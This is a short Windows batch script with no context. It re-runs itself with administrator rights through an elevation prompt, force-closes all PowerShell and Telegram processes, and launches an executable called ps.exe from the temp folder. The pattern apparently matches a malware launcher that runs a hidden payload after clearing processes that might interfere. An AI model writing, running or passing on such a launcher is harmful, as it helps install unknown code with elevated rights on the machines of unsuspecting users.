@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
taskkill /f /im powershell.exe
taskkill /f /im telegram.exe
start /max "" "%temp%\ps.exe"